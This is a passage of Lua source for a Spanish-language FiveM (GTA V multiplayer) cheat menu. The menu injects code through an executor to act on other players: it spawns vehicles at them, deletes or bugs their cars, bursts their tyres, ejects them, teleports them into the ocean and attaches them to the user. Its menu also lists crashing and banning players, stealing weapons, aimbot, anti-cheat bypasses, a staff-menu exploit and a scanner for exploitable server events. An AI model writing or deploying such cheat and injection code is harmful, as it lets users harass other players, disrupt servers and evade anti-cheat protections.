                    local coords = GetEntityCoords(targetPed)
                    local vehicleHash = `adder`
                    RequestModel(vehicleHash)
                    while not HasModelLoaded(vehicleHash) do Wait(0) end
                    
                    
                    for i = 1, 5 do
                        local veh = CreateVehicle(vehicleHash, 
                            coords.x + math.random(-50, 50), 
                            coords.y + math.random(-50, 50), 
                            coords.z + 5.0, 
                            0.0, true, true, true
                        )
                        local targetCoords = GetEntityCoords(targetPed)
                        TaskVehicleDriveToCoord(veh, -1, targetCoords.x, targetCoords.y, targetCoords.z, 100.0, 1.0, vehicleHash, 16777216, 10.0, true)
                        Wait(1000)
                    end
                end)
            ]], targetServerId)
        end
        
        Susano.InjectResource("any", code)
    end
end

function Menu.ActionBugVehicle()
    if not Menu.SelectedPlayer then return end
    
    local targetServerId = Menu.SelectedPlayer
    local mode = Menu.BugVehicleMode or "V1"
    
    if type(Susano) == "table" and type(Susano.InjectResource) == "function" then
        local code = string.format([[
            CreateThread(function()
                local targetServerId = %d
                local targetPlayerId = nil
                for _, player in ipairs(GetActivePlayers()) do
                    if GetPlayerServerId(player) == targetServerId then
                        targetPlayerId = player
                        break
                    end
                end
                if not targetPlayerId then return end
                
                local targetPed = GetPlayerPed(targetPlayerId)
                if not DoesEntityExist(targetPed) then return end
                
                if not IsPedInAnyVehicle(targetPed, false) then return end
                
                local targetVehicle = GetVehiclePedIsIn(targetPed, false)
                if not DoesEntityExist(targetVehicle) then return end
                
                
                if "%s" == "V1" then
                    
                    for i = 1, 20 do
                        SetEntityCollision(targetVehicle, false, false)
                        local coords = GetEntityCoords(targetVehicle)
                        SetEntityCoords(targetVehicle, coords.x, coords.y, coords.z - 1.0, false, false, false, false)
                        Wait(50)
                        SetEntityCollision(targetVehicle, true, true)
                        Wait(50)
                    end
                else
                    
                    SetEntityAlpha(targetVehicle, 0)
                    SetEntityVisible(targetVehicle, false, false)
                    Wait(5000)
                    SetEntityAlpha(targetVehicle, 255)
                    SetEntityVisible(targetVehicle, true, false)
                end
            end)
        ]], targetServerId, mode)
        
        Susano.InjectResource("any", code)
    end
end

function Menu.ActionKickVehicle()
    if not Menu.SelectedPlayer then return end
    
    local targetServerId = Menu.SelectedPlayer
    local mode = Menu.KickVehicleMode or "V1"
    
    if type(Susano) == "table" and type(Susano.InjectResource) == "function" then
        local code = string.format([[
            CreateThread(function()
                local targetServerId = %d
                local targetPlayerId = nil
                for _, player in ipairs(GetActivePlayers()) do
                    if GetPlayerServerId(player) == targetServerId then
                        targetPlayerId = player
                        break
                    end
                end
                if not targetPlayerId then return end
                
                local targetPed = GetPlayerPed(targetPlayerId)
                if not DoesEntityExist(targetPed) then return end
                
                if not IsPedInAnyVehicle(targetPed, false) then return end
                
                local targetVehicle = GetVehiclePedIsIn(targetPed, false)
                if not DoesEntityExist(targetVehicle) then return end
                
                
                if "%s" == "V1" then
                    
                    ClearPedTasksImmediately(targetPed)
                    TaskLeaveVehicle(targetPed, targetVehicle, 16)
                else
                    
                    local coords = GetEntityCoords(targetVehicle)
                    DeleteEntity(targetVehicle)
                    SetEntityCoords(targetPed, coords.x, coords.y, coords.z + 1.0, false, false, false, false)
                end
            end)
        ]], targetServerId, mode)
        
        Susano.InjectResource("any", code)
    end
end

function Menu.ActionRemoveAllTires()
    if not Menu.SelectedPlayer then return end
    
    local targetServerId = Menu.SelectedPlayer
    
    if type(Susano) == "table" and type(Susano.InjectResource) == "function" then
        local code = string.format([[
            CreateThread(function()
                local targetServerId = %d
                local targetPlayerId = nil
                for _, player in ipairs(GetActivePlayers()) do
                    if GetPlayerServerId(player) == targetServerId then
                        targetPlayerId = player
                        break
                    end
                end
                if not targetPlayerId then return end
                
                local targetPed = GetPlayerPed(targetPlayerId)
                if not DoesEntityExist(targetPed) then return end
                
                if not IsPedInAnyVehicle(targetPed, false) then return end
                
                local targetVehicle = GetVehiclePedIsIn(targetPed, false)
                if not DoesEntityExist(targetVehicle) then return end
                
                
                local tireCount = 0
                if IsThisModelACar(GetEntityModel(targetVehicle)) then
                    tireCount = 4
                elseif IsThisModelABike(GetEntityModel(targetVehicle)) then
                    tireCount = 2
                elseif IsThisModelATrailer(GetEntityModel(targetVehicle)) then
                    tireCount = 8
                end
                
                for i = 0, tireCount - 1 do
                    SetVehicleTyreBurst(targetVehicle, i, true, 1000.0)
                end
            end)
        ]], targetServerId)
        
        Susano.InjectResource("any", code)
    end
end

function Menu.ActionGive()
    if not Menu.SelectedPlayer then return end
    
    local targetServerId = Menu.SelectedPlayer
    local mode = Menu.GiveMode or "Vehiculo"
    
    if type(Susano) == "table" and type(Susano.InjectResource) == "function" then
        local code = ""
        
        if mode == "Vehiculo" then
            code = string.format([[
                CreateThread(function()
                    local targetServerId = %d
                    local targetPlayerId = nil
                    for _, player in ipairs(GetActivePlayers()) do
                        if GetPlayerServerId(player) == targetServerId then
                            targetPlayerId = player
                            break
                        end
                    end
                    if not targetPlayerId then return end
                    
                    local targetPed = GetPlayerPed(targetPlayerId)
                    if not DoesEntityExist(targetPed) then return end
                    
                    local coords = GetEntityCoords(targetPed)
                    local vehicleHash = `adder`
                    RequestModel(vehicleHash)
                    while not HasModelLoaded(vehicleHash) do Wait(0) end
                    
                    local veh = CreateVehicle(vehicleHash, coords.x + 5.0, coords.y + 5.0, coords.z, 0.0, true, true, true)
                    SetVehicleEngineOn(veh, true, true, false)
                end)
            ]], targetServerId)
        elseif mode == "Rampa" then
            code = string.format([[
                CreateThread(function()
                    local targetServerId = %d
                    local targetPlayerId = nil
                    for _, player in ipairs(GetActivePlayers()) do
                        if GetPlayerServerId(player) == targetServerId then
                            targetPlayerId = player
                            break
                        end
                    end
                    if not targetPlayerId then return end
                    
                    local targetPed = GetPlayerPed(targetPlayerId)
                    if not DoesEntityExist(targetPed) then return end
                    
                    local coords = GetEntityCoords(targetPed)
                    local objectHash = `prop_mp_ramp_02`
                    RequestModel(objectHash)
                    while not HasModelLoaded(objectHash) do Wait(0) end
                    
                    local ramp = CreateObject(objectHash, coords.x + 5.0, coords.y, coords.z, true, true, true)
                    PlaceObjectOnGroundProperly(ramp)
                    FreezeEntityPosition(ramp, true)
                end)
            ]], targetServerId)
        elseif mode == "Muro" or mode == "Muro 2" then
            code = string.format([[
                CreateThread(function()
                    local targetServerId = %d
                    local targetPlayerId = nil
                    for _, player in ipairs(GetActivePlayers()) do
                        if GetPlayerServerId(player) == targetServerId then
                            targetPlayerId = player
                            break
                        end
                    end
                    if not targetPlayerId then return end
                    
                    local targetPed = GetPlayerPed(targetPlayerId)
                    if not DoesEntityExist(targetPed) then return end
                    
                    local coords = GetEntityCoords(targetPed)
                    local objectHash = "%s" == "Muro 2" and `prop_mp_barrier_02b` or `prop_fence_03a`
                    RequestModel(objectHash)
                    while not HasModelLoaded(objectHash) do Wait(0) end
                    
                    for i = 1, 5 do
                        local wall = CreateObject(objectHash, 
                            coords.x + 5.0, 
                            coords.y + (i * 2.0), 
                            coords.z, 
                            true, true, true
                        )
                        PlaceObjectOnGroundProperly(wall)
                        FreezeEntityPosition(wall, true)
                    end
                end)
            ]], targetServerId, mode)
        end
        
        Susano.InjectResource("any", code)
    end
end

function Menu.ActionTPTo()
    if not Menu.SelectedPlayer then return end
    
    local targetServerId = Menu.SelectedPlayer
    local location = Menu.TPLocation or "oceano"
    
    local locations = {
        oceano = {x = -2000.0, y = -1000.0, z = 0.0},
        mazebank = {x = -75.0, y = -818.0, z = 326.0},
        ["sandy shores"] = {x = 1856.0, y = 3689.0, z = 34.0}
    }
    
    local loc = locations[location] or locations.oceano
    
    if type(Susano) == "table" and type(Susano.InjectResource) == "function" then
        local code = string.format([[
            CreateThread(function()
                local targetServerId = %d
                local targetPlayerId = nil
                for _, player in ipairs(GetActivePlayers()) do
                    if GetPlayerServerId(player) == targetServerId then
                        targetPlayerId = player
                        break
                    end
                end
                if not targetPlayerId then return end
                
                local targetPed = GetPlayerPed(targetPlayerId)
                if not DoesEntityExist(targetPed) then return end
                
               
                SetEntityCoords(targetPed, %f, %f, %f, false, false, false, false)
            end)
        ]], targetServerId, loc.x, loc.y, loc.z)
        
        Susano.InjectResource("any", code)
    end
end

function Menu.ActionNPCDrive()
    if not Menu.SelectedPlayer then return end
    
    local targetServerId = Menu.SelectedPlayer
    
    if type(Susano) == "table" and type(Susano.InjectResource) == "function" then
        local code = string.format([[
            CreateThread(function()
                local targetServerId = %d
                local targetPlayerId = nil
                for _, player in ipairs(GetActivePlayers()) do
                    if GetPlayerServerId(player) == targetServerId then
                        targetPlayerId = player
                        break
                    end
                end
                if not targetPlayerId then return end
                
                local targetPed = GetPlayerPed(targetPlayerId)
                if not DoesEntityExist(targetPed) then return end
                
                if not IsPedInAnyVehicle(targetPed, false) then return end
                
                local targetVehicle = GetVehiclePedIsIn(targetPed, false)
                if not DoesEntityExist(targetVehicle) then return end
                
                
                local npcHash = `a_m_m_business_01`
                RequestModel(npcHash)
                while not HasModelLoaded(npcHash) do Wait(0) end
                
                local coords = GetEntityCoords(targetVehicle)
                local npc = CreatePed(4, npcHash, coords.x + 5.0, coords.y + 5.0, coords.z, 0.0, true, true)
                
                
                ClearPedTasksImmediately(targetPed)
                TaskLeaveVehicle(targetPed, targetVehicle, 16)
                Wait(2000)
                
                SetPedIntoVehicle(npc, targetVehicle, -1)
                TaskVehicleDriveWander(npc, targetVehicle, 100.0, 786603)
                
                
                SetEntityCoords(targetPed, coords.x, coords.y, coords.z + 1.0, false, false, false, false)
            end)
        ]], targetServerId)
        
        Susano.InjectResource("any", code)
    end
end

if Menu.DrawWatermark then
    Menu.DrawWatermark = function() return end
end

if Menu.UpdatePlayerCount then
    Menu.UpdatePlayerCount = function() return end
end

Menu.shooteyesEnabled = false
Menu.magicbulletEnabled = false
Menu.silentAimEnabled = false
Menu.superPunchEnabled = false
Menu.rapidFireEnabled = false
Menu.infiniteAmmoEnabled = false
Menu.noSpreadEnabled = false
Menu.noRecoilEnabled = false
Menu.noReloadEnabled = false
Menu.unlockAllVehicleEnabled = false

Menu.ShowBlossoms = false
Menu.FOVWarp = false
Menu.WarpPressW = false

local foundVehicles = {}
local Actions = {}
local attachedPlayers = {}

local attachTargetActive = false
local attachTargetServerId = nil
local banPlayerActive = false
local banPlayerThread = nil
local function ToggleAttachTarget(enable)
    attachTargetActive = enable
    if not enable then
        if attachTargetServerId then
            if type(Susano) == "table" and type(Susano.InjectResource) == "function" then
                Susano.InjectResource("any", string.format([[
                    rawset(_G, 'attach_target_loop_%d', false)
                ]], attachTargetServerId))
            end
            attachTargetServerId = nil
        end
        return
    end

    Citizen.CreateThread(function()
        local function RotationToDirection(rotation)
            local adjustedRotation = vector3((math.pi / 180) * rotation.x, (math.pi / 180) * rotation.y, (math.pi / 180) * rotation.z)
            local direction = vector3(-math.sin(adjustedRotation.z) * math.abs(math.cos(adjustedRotation.x)), math.cos(adjustedRotation.z) * math.abs(math.cos(adjustedRotation.x)), math.sin(adjustedRotation.x))
            return direction
        end

        while attachTargetActive do
            Citizen.Wait(100)
            if IsControlJustPressed(0, 74) then
                local success, err = pcall(function()
                    local playerPed = PlayerPedId()
                    if not DoesEntityExist(playerPed) then return end

                    local camPos = GetGameplayCamCoord()
                    local camRot = GetGameplayCamRot(2)
                    local direction = RotationToDirection(camRot)
                    local dest = vector3(camPos.x + direction.x * 1000.0, camPos.y + direction.y * 1000.0, camPos.z + direction.z * 1000.0)

                    local rayHandle = StartShapeTestRay(camPos.x, camPos.y, camPos.z, dest.x, dest.y, dest.z, 10, playerPed, 0)
                    Wait(0)
                    local _, hit, _, _, entityHit = GetShapeTestResult(rayHandle)

                local targetServerId = nil

                if hit == 1 and entityHit and entityHit ~= 0 and DoesEntityExist(entityHit) and IsEntityAPed(entityHit) then
                    local targetPed = entityHit

                    if targetPed == playerPed then
                        goto continue
                    end

                    for _, player in ipairs(GetActivePlayers()) do
                        local ped = GetPlayerPed(player)
                        if ped and ped ~= 0 and DoesEntityExist(ped) and ped == targetPed then
                            targetServerId = GetPlayerServerId(player)
                            break
                        end
                    end
                else
                    local closestPed = nil
                    local closestDistance = 5.0
                    local playerCoords = GetEntityCoords(playerPed)

                    for _, player in ipairs(GetActivePlayers()) do
                        if player ~= PlayerId() then
                            local targetPed = GetPlayerPed(player)
                            if targetPed and targetPed ~= 0 and DoesEntityExist(targetPed) and not IsPedDeadOrDying(targetPed, true) then
                                local pedCoords = GetEntityCoords(targetPed)
                                local distance = #(pedCoords - playerCoords)

                                if distance <= closestDistance and distance > 0.0 then
                                    local screenX, screenY = GetScreenCoordFromWorldCoord(pedCoords.x, pedCoords.y, pedCoords.z)
                                    if screenX >= 0.0 and screenX <= 1.0 and screenY >= 0.0 and screenY <= 1.0 then
                                        local dirToPed = pedCoords - camPos
                                        local distToPed = #dirToPed
                                        if distToPed > 0.1 then
                                            dirToPed = dirToPed / distToPed
                                            local dot = direction.x * dirToPed.x + direction.y * dirToPed.y + direction.z * dirToPed.z
                                            if dot > 0.9 then
                                                closestPed = targetPed
                                                closestDistance = distance
                                                targetServerId = GetPlayerServerId(player)
                                            end
                                        end
                                    end
                                end
                            end
                        end
                    end
                end

                if targetServerId then
                    if attachTargetServerId == targetServerId then
                        if type(Susano) == "table" and type(Susano.InjectResource) == "function" then
                            Susano.InjectResource("any", string.format([[
                                rawset(_G, 'attach_target_loop_%d', false)
                            ]], targetServerId))
                        end
                        attachTargetServerId = nil
                    else
                        if attachTargetServerId then
                            if type(Susano) == "table" and type(Susano.InjectResource) == "function" then
                                Susano.InjectResource("any", string.format([[
                                    rawset(_G, 'attach_target_loop_%d', false)
                                ]], attachTargetServerId))
                            end
                        end

                        attachTargetServerId = targetServerId

                        if type(Susano) == "table" and type(Susano.InjectResource) == "function" then
                            Susano.InjectResource("any", string.format([[
                                local targetServerId = %d
                                local playerPed = PlayerPedId()

                                local targetPlayerId = nil
                                for _, player in ipairs(GetActivePlayers()) do
                                    if GetPlayerServerId(player) == targetServerId then
                                        targetPlayerId = player
                                        break
                                    end
                                end

                                if not targetPlayerId then return end
                                local targetPed = GetPlayerPed(targetPlayerId)
                                if not DoesEntityExist(targetPed) then return end

                                rawset(_G, 'attach_target_loop_' .. targetServerId, true)

                                CreateThread(function()
                                    while rawget(_G, 'attach_target_loop_' .. targetServerId) do
                                        Wait(100)

                                        local success, err = pcall(function()
                                            if not DoesEntityExist(playerPed) or not DoesEntityExist(targetPed) then
                                                rawset(_G, 'attach_target_loop_' .. targetServerId, false)
                                                return
                                            end

                                            local myCoords = GetEntityCoords(playerPed)
                                            local myForward = GetEntityForwardVector(playerPed)
                                            local myHeading = GetEntityHeading(playerPed)

                                            if myCoords and myForward then
                                                SetEntityCoordsNoOffset(targetPed, myCoords.x + myForward.x, myCoords.y + myForward.y, myCoords.z + myForward.z, true, true, true)
                                                SetEntityHeading(targetPed, myHeading)
                                            end
                                        end)

                                        if not success then
                                            rawset(_G, 'attach_target_loop_' .. targetServerId, false)
                                            break
                                        end
                                    end
                                end)
                            ]], targetServerId))
                        end
                    end
                end
                ::continue::
                end)
                if not success then

                end
            end
        end
    end)
end

local selectedWeaponIndex = {
    melee = 1,
    pistol = 1,
    smg = 1,
    shotgun = 1,
    ar = 1,
    sniper = 1,
    heavy = 1
}

local weaponLists = {
    melee = {
        {name = "WEAPON_KNIFE", display = "Cuchillo"},
        {name = "WEAPON_BAT", display = "Bate"},
        {name = "WEAPON_CROWBAR", display = "Palanca"},
        {name = "WEAPON_GOLFCLUB", display = "Palo de golf"},
        {name = "WEAPON_HAMMER", display = "Martillo"},
        {name = "WEAPON_HATCHET", display = "Hacha"},
        {name = "WEAPON_KNUCKLE", display = "Punos americanos"},
        {name = "WEAPON_MACHETE", display = "Machete"},
        {name = "WEAPON_SWITCHBLADE", display = "Navaja"},
        {name = "WEAPON_NIGHTSTICK", display = "Porra"},
        {name = "WEAPON_WRENCH", display = "Llave inglesa"},
        {name = "WEAPON_BATTLEAXE", display = "Hacha de batalla"},
        {name = "WEAPON_POOLCUE", display = "Taco de billar"},
        {name = "WEAPON_STONE_HATCHET", display = "Hacha de piedra"}
    },
    pistol = {
        {name = "WEAPON_PISTOL", display = "Pistola"},
        {name = "WEAPON_PISTOL_MK2", display = "Pistola MK2"},
        {name = "WEAPON_COMBATPISTOL", display = "Pistola de combate"},
        {name = "WEAPON_PISTOL50", display = "Pistola .50"},
        {name = "WEAPON_SNSPISTOL", display = "Pistola SNS"},
        {name = "WEAPON_SNSPISTOL_MK2", display = "Pistola SNS MK2"},
        {name = "WEAPON_HEAVYPISTOL", display = "Pistola pesada"},
        {name = "WEAPON_VINTAGEPISTOL", display = "Pistola vintage"},
        {name = "WEAPON_FLAREGUN", display = "Lanza bengalas"},
        {name = "WEAPON_MARKSMANPISTOL", display = "Pistola de tirador"},
        {name = "WEAPON_REVOLVER", display = "Revolver pesado"},
        {name = "WEAPON_REVOLVER_MK2", display = "Revolver pesado MK2"},
        {name = "WEAPON_DOUBLEACTION", display = "Revolver de doble accion"},
        {name = "WEAPON_APPISTOL", display = "Pistola AP"},
        {name = "WEAPON_STUNGUN", display = "Taser"},
        {name = "WEAPON_CERAMICPISTOL", display = "Pistola ceramica"},
        {name = "WEAPON_NAVYREVOLVER", display = "Revolver naval"}
    },
    smg = {
        {name = "WEAPON_MICROSMG", display = "Micro SMG"},
        {name = "WEAPON_SMG", display = "SMG"},
        {name = "WEAPON_SMG_MK2", display = "SMG MK2"},
        {name = "WEAPON_ASSAULTSMG", display = "SMG de asalto"},
        {name = "WEAPON_COMBATPDW", display = "PDW de combate"},
        {name = "WEAPON_MACHINEPISTOL", display = "Pistola ametralladora"},
        {name = "WEAPON_MINISMG", display = "Mini SMG"},
        {name = "WEAPON_GUSENBERG", display = "Gusenberg"}
    },
    shotgun = {
        {name = "WEAPON_PUMPSHOTGUN", display = "Escopeta de bomba"},
        {name = "WEAPON_PUMPSHOTGUN_MK2", display = "Escopeta de bomba MK2"},
        {name = "WEAPON_SAWNOFFSHOTGUN", display = "Escopeta recortada"},
        {name = "WEAPON_ASSAULTSHOTGUN", display = "Escopeta de asalto"},
        {name = "WEAPON_BULLPUPSHOTGUN", display = "Escopeta bullpup"},
        {name = "WEAPON_MUSKET", display = "Mosquete"},
        {name = "WEAPON_HEAVYSHOTGUN", display = "Escopeta pesada"},
        {name = "WEAPON_DBSHOTGUN", display = "Escopeta de dos canones"},
        {name = "WEAPON_AUTOSHOTGUN", display = "Escopeta automatica"},
        {name = "WEAPON_COMBATSHOTGUN", display = "Escopeta de combate"}
    },
    ar = {
        {name = "WEAPON_ASSAULTRIFLE", display = "Fusil de asalto"},
        {name = "WEAPON_ASSAULTRIFLE_MK2", display = "Fusil de asalto MK2"},
        {name = "WEAPON_CARBINERIFLE", display = "Carabina"},
        {name = "WEAPON_CARBINERIFLE_MK2", display = "Carabina MK2"},
        {name = "WEAPON_ADVANCEDRIFLE", display = "Fusil avanzado"},
        {name = "WEAPON_SPECIALCARBINE", display = "Carabina especial"},
        {name = "WEAPON_SPECIALCARBINE_MK2", display = "Carabina especial MK2"},
        {name = "WEAPON_BULLPUPRIFLE", display = "Fusil bullpup"},
        {name = "WEAPON_BULLPUPRIFLE_MK2", display = "Fusil bullpup MK2"},
        {name = "WEAPON_COMPACTRIFLE", display = "Fusil compacto"},
        {name = "WEAPON_MILITARYRIFLE", display = "Fusil militar"},
        {name = "WEAPON_HEAVYRIFLE", display = "Fusil pesado"},
        {name = "WEAPON_TACTICALRIFLE", display = "Fusil tactico"}
    },
    sniper = {
        {name = "WEAPON_SNIPERRIFLE", display = "Fusil de francotirador"},
        {name = "WEAPON_HEAVYSNIPER", display = "Francotirador pesado"},
        {name = "WEAPON_HEAVYSNIPER_MK2", display = "Francotirador pesado MK2"},
        {name = "WEAPON_MARKSMANRIFLE", display = "Fusil de tirador"},
        {name = "WEAPON_MARKSMANRIFLE_MK2", display = "Fusil de tirador MK2"},
        {name = "WEAPON_PRECISIONRIFLE", display = "Fusil de precision"}
    },
    heavy = {
        {name = "WEAPON_RPG", display = "RPG"},
        {name = "WEAPON_GRENADELAUNCHER", display = "Lanzagranadas"},
        {name = "WEAPON_GRENADELAUNCHER_SMOKE", display = "Lanzagranadas de humo"},
        {name = "WEAPON_MINIGUN", display = "Minigun"},
        {name = "WEAPON_FIREWORK", display = "Lanzacohetes de fuegos artificiales"},
        {name = "WEAPON_RAILGUN", display = "Railgun"},
        {name = "WEAPON_HOMINGLAUNCHER", display = "Lanzamisiles guiados"},
        {name = "WEAPON_COMPACTLAUNCHER", display = "Lanzagranadas compacto"},
        {name = "WEAPON_RAYMINIGUN", display = "Widowmaker"},
        {name = "WEAPON_EMPLAUNCHER", display = "Lanzador EMP compacto"},
        {name = "WEAPON_RAILGUNXM3", display = "Railgun XM3"}
    }
}

local function GenerateNativeHooks(nativesList)
    local hooks = [[
local function hNative(nativeName, newFunction)
    local originalNative = _G[nativeName]
    if not originalNative or type(originalNative) ~= "function" then return end
    _G[nativeName] = function(...) return newFunction(originalNative, ...) end
end
]]
    for _, nativeName in ipairs(nativesList) do
        hooks = hooks .. string.format('hNative("%s", function(originalFn, ...) return originalFn(...) end)\n', nativeName)
    end
    return hooks
end

local COMMON_NATIVES = {
    "GetActivePlayers", "GetPlayerServerId", "GetPlayerPed", "DoesEntityExist",
    "PlayerPedId", "GetEntityCoords", "SetEntityCoordsNoOffset", "GetEntityHeading",
    "SetEntityHeading", "IsPedInAnyVehicle", "GetVehiclePedIsIn"
}

local VEHICLE_NATIVES = {
    "TaskWarpPedIntoVehicle", "SetVehicleDoorsLocked", "SetVehicleDoorsLockedForAllPlayers",
    "IsVehicleSeatFree", "ClearPedTasksImmediately", "TaskEnterVehicle",
    "GetClosestVehicle", "SetPedIntoVehicle", "SetEntityAsMissionEntity",
    "NetworkGetEntityIsNetworked", "NetworkRequestControlOfEntity", "AttachEntityToEntity",
    "DetachEntity", "AttachEntityToEntityPhysically", "GetOffsetFromEntityInWorldCoords",
    "SetEntityRotation", "FreezeEntityPosition", "TaskLeaveVehicle", "DeletePed",
    "GetPedInVehicleSeat", "NetworkHasControlOfEntity"
}

local function WrapWithVehicleHooks(code)
    local allNatives = {}
    for _, n in ipairs(COMMON_NATIVES) do table.insert(allNatives, n) end
    for _, n in ipairs(VEHICLE_NATIVES) do table.insert(allNatives, n) end
    return GenerateNativeHooks(allNatives) .. "\n" .. code
end

-- Estructura del menu en español (solo ASCII)
Menu.Categories = {
    { name = "MENU PRINCIPAL", icon = "⚡" },    { name = "Jugador", icon = "👤", hasTabs = true, tabs = {
        { name = "Personal", items = {
            { name = "Inmortal", type = "toggle", value = false },
            { name = "Semi-inmortal", type = "toggle", value = false },
            { name = "Curar", type = "action" },
            { name = "Suicidarse", type = "action" },
            { name = "Limpiar ped", type = "action" },
            { name = "Invisible", type = "toggle", value = false }
        }},
        { name = "Movimiento", items = {
            { name = "", isSeparator = true, separatorText = "noclip" },
            { name = "Noclip", type = "toggle", value = false, hasSlider = true, sliderValue = 1.0, sliderMin = 1.0, sliderMax = 20.0, sliderStep = 0.5 },
            { name = "Tipo Noclip", type = "selector", options = {"normal", "staff"}, selected = 1 },
            { name = "", isSeparator = true, separatorText = "camara libre" },
            { name = "Freecam", type = "toggle", value = false, hasSlider = true, sliderValue = 0.5, sliderMin = 0.1, sliderMax = 5.0, sliderStep = 0.1 },
            { name = "", isSeparator = true, separatorText = "otros" },
            { name = "Correr rapido", type = "toggle", value = false },
            { name = "Sin caidas", type = "toggle", value = false }
        }},
        { name = "Revive", items = {
            { name = "Revivir", type = "action" },
            { name = "Revivir (ESX)", type = "action", onClick = revivirESX },
            { name = "Revivir (QB/QC)", type = "action", onClick = revivirQB }
        }}
    }},
    { name = "En linea", icon = "👥", hasTabs = true, tabs = {
        { name = "Lista de jugadores", items = {
            { name = "Cargando jugadores...", type = "action" }
        }},
        { name = "Troleo", items = {
            { name = "", isSeparator = true, separatorText = "Apariencia" },
            { name = "Copiar apariencia", type = "action" },
            { name = "", isSeparator = true, separatorText = "Ataques" },
            { name = "Banear jugador", type = "toggle", value = false },
            { name = "Crashear jugador", type = "toggle", value = false },
            { name = "Clonar infinitamente", type = "action" },
            { name = "Incendiar jugador", type = "action" },
            { name = "Robar armas", type = "action" },
            { name = "Disparar a jugador", type = "action" },
            { name = "Enjaular jugador", type = "action" },
            { name = "Agujero negro", type = "toggle", value = false },
            { name = "Invalid Hook Kick", type = "action" }
        }},
        { name = "Vehiculo", items = {
            { name = "", isSeparator = true, separatorText = "Bugs" },
            { name = "Bug vehiculo", type = "selector", options = {"V1", "V2"}, selected = 1 },
            { name = "Warp", type = "selector", options = {"Clasico", "Aceleron"}, selected = 1 },
            { name = "", isSeparator = true, separatorText = "Teletransporte" },
            { name = "TP a", type = "selector", options = {"oceano", "mazebank", "sandy shores"}, selected = 1 },
            { name = "", isSeparator = true, separatorText = "Acciones" },
            { name = "Control remoto", type = "action" },
            { name = "Robar vehiculo", type = "action" },
            { name = "Conducir NPC", type = "action" },
            { name = "Eliminar vehiculo", type = "action" },
            { name = "Expulsar", type = "selector", options = {"V1", "V2"}, selected = 1 },
            { name = "quitar todas las ruedas", type = "action" },
            { name = "Regalar", type = "selector", options = {"Vehiculo"}, selected = 1 }
        }},
        { name = "todos", items = {
            { name = "Lanzar todos", type = "action" },
            { name = "Crashear todos", type = "action" },
            { name = "Incendiar todos", type = "action" },
            { name = "Robar armas todos", type = "action" }
        }}
    }},
    { name = "Combate", icon = "🔫", hasTabs = true, tabs = {
        { name = "General", items = {
            { name = "Aimbot Pro", type = "toggle", value = false },
            { name = "Silent Aim", type = "toggle", value = false },
            { name = "Sin retroceso", type = "toggle", value = false },
            { name = "Super punetazo", type = "toggle", value = false }
        }}
    }},
    { name = "Auto-Farm", icon = "🚜", hasTabs = true, tabs = {
        { name = "Trabajos", items = {
            { name = "Auto-Recolectar", type = "toggle", value = false },
            { name = "Auto-Procesar", type = "toggle", value = false },
            { name = "Auto-Vender", type = "toggle", value = false },
            { name = "", isSeparator = true, separatorText = "Configuracion" },
            { name = "Velocidad Farm", type = "slider", value = 1.0, min = 0.5, max = 5.0, step = 0.1 }
        }}
    }},

    { name = "Destroyer", icon = "💥", hasTabs = true, tabs = {
        { name = "General", items = {
            { name = "Freecam (Props)", type = "toggle", value = false, hasSlider = true, sliderValue = 0.5, sliderMin = 0.1, sliderMax = 5.0, sliderStep = 0.1 }
        }}
    }},
    { name = "Vehiculo", icon = "🚗", hasTabs = true, tabs = {
        { name = "Rendimiento", items = {
            { name = "", isSeparator = true, separatorText = "Warp" },
            { name = "Warp FOV", type = "toggle", value = false, onClick = function(val) Menu.FOVWarp = val end },
            { name = "Warp al presionar W", type = "toggle", value = false, onClick = function(val) Menu.WarpPressW = val end },
            { name = "Lanzar desde vehiculo", type = "toggle", value = false },
            { name = "", isSeparator = true, separatorText = "rendimiento" },
            { name = "Mejora maxima", type = "action" },
            { name = "Reparar vehiculo", type = "action" },
            { name = "Enderezar vehiculo", type = "action" },
            { name = "Forzar motor encendido", type = "toggle", value = false },
            { name = "Manejo facil", type = "toggle", value = false },
            { name = "Boost con Shift", type = "toggle", value = false },
            { name = "Vehiculo gravitatorio", type = "toggle", value = false },
            { name = "Velocidad gravitatoria", type = "slider", value = 100, min = 50, max = 500, step = 10 },
            { name = "", isSeparator = true, separatorText = "Mantenimiento" },
            { name = "Cambiar matricula", type = "action" },
            { name = "Limpiar vehiculo", type = "action" },
            { name = "Eliminar vehiculo", type = "action" },
            { name = "", isSeparator = true, separatorText = "Acceso" },
            { name = "Desbloquear todos los vehiculos", type = "toggle", value = false },
            { name = "TP al vehiculo mas cercano", type = "action" },
            { name = "", isSeparator = true, separatorText = "Modificaciones" },
            { name = "Sin colisiones", type = "toggle", value = false },
            { name = "Salto de conejo", type = "toggle", value = false },
            { name = "Salto hacia atras", type = "toggle", value = false },
            { name = "", isSeparator = true, separatorText = "Regalar" },
            { name = "Regalar vehiculo mas cercano", type = "action" },
            { name = "Pintura arcoiris", type = "toggle", value = false },
            { name = "", isSeparator = true, separatorText = "Cargar/Lanzar vehículo" },
            { name = "Cargar vehiculo (apuntar)", type = "action", onClick = cargarVehiculo },
            { name = "Lanzar vehiculo (cargado)", type = "action", onClick = lanzarVehiculo }
        }}
    }},
    { name = "Varios", icon = "📄", hasTabs = true, tabs = {
        { name = "General", items = {
            { name = "", isSeparator = true, separatorText = "Teletransporte" },
            { name = "Teletransportar a", type = "selector", options = {
                "Punto de ruta",
                "Edificio FIB",
                "Comisaria de Mission Row",
                "Hospital Pillbox",
                "Calle Grove",
                "Plaza Legion"
            }, selected = 1 },
            { name = "Vision teletransporte", type = "toggle", value = false },
            { name = "Disparo teletransporte", type = "toggle", value = false },
            { name = "", isSeparator = true, separatorText = "Cosas del servidor" },
            { name = "Modo staff", type = "toggle", value = false },
            { name = "Desactivar dano de armas", type = "toggle", value = false },
            { name = "Matar todos los peds", type = "toggle", value = false },
            { name = "", isSeparator = true, separatorText = "Objetivo" },
            { name = "Lanzar sobre objetivo", type = "toggle", value = false },
        }},
        { name = "Bypasses", items = {
            { name = "", isSeparator = true, separatorText = "Anti Cheat" },
            { name = "Bypass Putin", type = "action" },
            { name = "Bypass entidades cliente", type = "action" },
            { name = "Bypass validacion eventos", type = "action" },
        }},
        { name = "Exploits", items = {
            { name = "Menu staff", type = "action" },
        }}
    }},
    { name = "Buscar eventos", icon = "🔍", hasTabs = true, tabs = {
        { name = "General", items = {
            { name = "Buscar triggers explotables", type = "action", onClick = function()
                TriggerEvent('chat:addMessage', {args = {"~y~Buscando eventos explotables..."}})
                Citizen.CreateThread(function()
                    TriggersEncontrados = {}
                    local commonTriggers = {
                        "esx_ambulancejob:revive", "hospital:server:RevivePlayer",
